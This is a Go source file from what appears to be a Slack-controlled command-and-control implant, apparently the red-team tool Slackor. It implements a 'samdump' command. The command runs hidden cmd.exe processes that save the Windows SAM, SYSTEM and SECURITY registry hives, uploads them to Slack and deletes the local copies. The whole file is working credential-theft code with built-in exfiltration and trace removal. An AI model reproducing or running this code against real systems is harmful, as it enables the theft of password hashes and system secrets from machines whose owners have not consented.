// +build windows

package windows

import (
	"os"
	"os/exec"
	"syscall"

	"github.com/Coalfire-Research/Slackor/internal/slack"
	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// SAMDump dumps the security account manager file
type SAMDump struct{}

// Name is the name of the command
func (s SAMDump) Name() string {
	return "samdump"
}

// Run dumps the security account manager file
func (s SAMDump) Run(clientID string, jobID string, args []string) (string, error) {
	cmdName := "cmd.exe"

	cmdArgs := []string{"/c", "reg.exe save HKLM\\SAM sam_" + clientID}
	cmd := exec.Command(cmdName, cmdArgs...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	cmd2Args := []string{"/c", "reg.exe save HKLM\\SYSTEM sys_" + clientID}
	cmd2 := exec.Command(cmdName, cmd2Args...)
	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd2.Run()

	cmd3Args := []string{"/c", "reg.exe save HKLM\\SECURITY security_" + clientID}
	cmd3 := exec.Command(cmdName, cmd3Args...)
	cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd3.Run()

	slack.Upload(clientID, jobID+"-1", "sam_"+clientID)
	slack.Upload(clientID, jobID+"-2", "sys_"+clientID)
	slack.Upload(clientID, jobID+"-3", "security_"+clientID)
	os.Remove("sam_" + clientID)
	os.Remove("sys_" + clientID)
	os.Remove("security_" + clientID)

	return "SAM files uploaded.", nil
}

func init() {
	command.RegisterCommand(SAMDump{})
}
